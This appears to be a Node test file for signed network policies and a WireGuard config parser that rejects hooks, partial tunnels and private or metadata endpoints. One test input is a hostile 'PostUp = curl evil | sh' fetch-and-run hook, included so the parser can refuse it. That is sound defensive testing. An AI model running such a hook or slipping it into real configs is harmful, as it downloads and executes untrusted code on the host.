// Network policy v5 (network/network-policy.mjs) and BYO WireGuard config parsing (network/wg-config.mjs).
import test from 'node:test';import assert from 'node:assert/strict';
import {privateKeyToAccount,generatePrivateKey} from 'viem/accounts';
import {defaultNetworkPolicy,validateNetworkPolicy,signNetworkPolicy,verifyNetworkPolicy,admitNetworkPolicy,networkUse} from '../network/network-policy.mjs';
import {parseWireGuardConfig,redactWireGuardConfig,wireGuardConfigDigest,privateAddress} from '../network/wg-config.mjs';

const id='0x'+'ab'.repeat(32),owner=privateKeyToAccount(generatePrivateKey()),other=privateKeyToAccount(generatePrivateKey());
const byo={version:5,deploymentId:id,nonce:3,issuedAt:1,mode:'byo-wireguard',fallback:'none',byo:{configDigest:'cd'.repeat(32),ingress:'enclave-network'},enclaveNetwork:{routes:2,guard:true,maxPricePerGiB6:0,budget6:0}};

test('the default is the Enclave network, free providers only, no fallback',()=>{
 const p=defaultNetworkPolicy(id);assert.equal(validateNetworkPolicy(p),p);
 assert.deepEqual(networkUse(p),{egress:'enclave-network',ingress:'enclave-network',fallback:'none',enclaveNetwork:p.enclaveNetwork});
});
test('every mode validates strictly',()=>{
 validateNetworkPolicy(byo);
 assert.deepEqual(networkUse(byo),{egress:'byo-wireguard',ingress:'enclave-network',fallback:'none',enclaveNetwork:byo.enclaveNetwork});
 validateNetworkPolicy({version:5,deploymentId:id,nonce:1,issuedAt:1,mode:'byo-wireguard',fallback:'none',byo:{configDigest:'cd'.repeat(32),ingress:'none'}});
 validateNetworkPolicy({version:5,deploymentId:id,nonce:1,issuedAt:1,mode:'direct',fallback:'none',direct:{maxPricePerGiB6:0}});
 const bad=[
  {...byo,extra:1},{...byo,mode:'tuna'},{...byo,fallback:'direct'},{...byo,nonce:-1},
  {...defaultNetworkPolicy(id),fallback:'enclave-network'},                                   // the network has no fallback
  {...byo,byo:{...byo.byo,ingress:'enclave-network'},enclaveNetwork:undefined},              // its ingress needs settings
  {...byo,byo:{configDigest:'xyz',ingress:'none'}},
  {...byo,byo:{...byo.byo,ingress:'none'}},                                                   // unused network settings
  {...defaultNetworkPolicy(id),enclaveNetwork:{routes:3,guard:true,maxPricePerGiB6:0,budget6:0}},
  {...defaultNetworkPolicy(id),enclaveNetwork:{routes:2,guard:false,maxPricePerGiB6:0,budget6:0}},
  {...defaultNetworkPolicy(id),enclaveNetwork:{routes:2,guard:true,maxPricePerGiB6:5,budget6:0}}, // a price needs a budget
  {...defaultNetworkPolicy(id),direct:{maxPricePerGiB6:0}},
 ].map(p=>JSON.parse(JSON.stringify(p)));
 for(const p of bad)assert.throws(()=>validateNetworkPolicy(p),undefined,JSON.stringify(p));
});
test('only the owner can sign a policy; stale and replayed nonces are refused',async()=>{
 const env=await signNetworkPolicy(owner,byo);
 assert.equal((await verifyNetworkPolicy(env,{owner:owner.address,deploymentId:id})).nonce,3);
 await assert.rejects(verifyNetworkPolicy(await signNetworkPolicy(other,byo),{owner:owner.address}),/owner signature/);
 await assert.rejects(verifyNetworkPolicy({...env,policy:{...byo,fallback:'enclave-network'}},{owner:owner.address}),/owner signature/); // altered after signing
 await assert.rejects(verifyNetworkPolicy(env,{owner:owner.address,deploymentId:'0x'+'cd'.repeat(32)}),/another app/);
 const seen=new Map(),memory={get:async k=>seen.get(k),set:async(k,v)=>seen.set(k,v)};
 await admitNetworkPolicy(env,{owner:owner.address,deploymentId:id,memory});
 await admitNetworkPolicy(env,{owner:owner.address,deploymentId:id,memory});                                  // same nonce: same policy, fine
 await admitNetworkPolicy(await signNetworkPolicy(owner,{...byo,nonce:4}),{owner:owner.address,deploymentId:id,memory});
 await assert.rejects(admitNetworkPolicy(env,{owner:owner.address,deploymentId:id,memory}),/stale/);            // replay after a newer one
 // an ERC-1271 owner is accepted only through the caller's chain check
 let asked;const verify=async(o,m,s)=>{asked=[o,m,s];return true;};
 await verifyNetworkPolicy({policy:byo,signature:'0x1234'},{owner:'0x'+'11'.repeat(20),verify});assert.match(asked[1],/^enclave-network:policy:v5\n/);
});

const K='yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=',P='xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=';
const good=`# from my VPN vendor
[Interface]
PrivateKey = ${K}
Address = 10.64.0.2/32, fd00:64::2/128
DNS = 10.64.0.1, fd00:64::1
MTU = 1380

[Peer]
PublicKey = ${P}
PresharedKey = ${K}
Endpoint = vpn.example.net:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
`;
test('a standard full-tunnel config parses to data only',async()=>{
 const {config,warnings}=parseWireGuardConfig(good);
 assert.deepEqual(config.addresses,['10.64.0.2','fd00:64::2']);assert.deepEqual(config.endpoint,{host:'vpn.example.net',port:51820});
 assert.deepEqual(config.allowedIPs,['0.0.0.0/0','::/0']);assert.equal(config.mtu,1380);assert.equal(warnings.length,0);
 const shown=JSON.stringify(redactWireGuardConfig(config));assert.ok(!shown.includes(K),'no private or preshared key in the redacted view');
 const a=await wireGuardConfigDigest('11'.repeat(32),config),b=await wireGuardConfigDigest('22'.repeat(32),config);
 assert.match(a,/^[0-9a-f]{64}$/);assert.notEqual(a,b,'the salt keeps the public digest from identifying a config');
 assert.equal(a,await wireGuardConfigDigest('11'.repeat(32),parseWireGuardConfig(good.replace('# from my VPN vendor','')).config));
 const v4only=parseWireGuardConfig(good.replace(', fd00:64::2/128','').replace(', fd00:64::1','').replace(', ::/0',''));
 assert.match(v4only.warnings[0],/IPv6 traffic will be refused/);
});
test('hooks, host-network settings, partial tunnels and private endpoints are refused',()=>{
 const refuse=(text,re)=>{try{parseWireGuardConfig(text);assert.fail('accepted: '+text);}catch(e){assert.ok(e.problems.some(p=>re.test(p)),e.problems.join(' | '));}};
 for(const hook of ['PostUp = curl evil | sh','PreUp = id','PreDown = x','PostDown = x','Table = off','SaveConfig = true','FwMark = 1','ListenPort = 51820'])
  refuse(good.replace('MTU = 1380',hook+'\nMTU = 1380'),/not allowed/);
 refuse(good.replace('AllowedIPs = 0.0.0.0/0, ::/0','AllowedIPs = 10.0.0.0/8'),/full-tunnel|full tunnel/);
 refuse(good.replace('AllowedIPs = 0.0.0.0/0, ::/0','AllowedIPs = 0.0.0.0/0'),/::\/0/);                    // v6 address without a v6 route would leak
 refuse(good.replace('AllowedIPs = 0.0.0.0/0, ::/0','AllowedIPs = 0.0.0.0/0, ::/0, 10.1.0.0/16'),/partial/);
 refuse(good.replace('vpn.example.net:51820','169.254.169.254:51820'),/public address/);
 refuse(good.replace('vpn.example.net:51820','10.0.0.5:51820'),/public address/);
 refuse(good.replace('vpn.example.net:51820','[fd00::5]:51820'),/public address/);
 refuse(good.replace(/DNS = .*\n/,''),/DNS is required/);
 refuse(good.replace('DNS = 10.64.0.1, fd00:64::1','DNS = 10.64.0.1, corp.example'),/no search domains/);
 refuse(good+'\n[Peer]\nPublicKey = '+P+'\nAllowedIPs = 0.0.0.0/0\nEndpoint = b.example.net:1\n',/one \[Peer\]/);
 refuse(good.replace(K,'not-a-key'),/PrivateKey/);
 refuse(good.replace('MTU = 1380','MTU = 9000'),/MTU/);
 refuse(good.replace('MTU = 1380','Bogus = 1'),/not a supported/);
 refuse('x'.repeat(9000),/8 KB/);
});
test('private address judgement',()=>{
 for(const a of ['10.1.1.1','127.0.0.1','169.254.169.254','100.64.1.1','192.168.0.1','172.31.0.1','::1','::','fd12::1','fe80::1','ff02::1','::ffff:10.0.0.1','2001:db8::1','0.0.0.0'])assert.equal(privateAddress(a),true,a);
 for(const a of ['1.1.1.1','134.199.235.187','2606:4700::1111'])assert.equal(privateAddress(a),false,a);
});
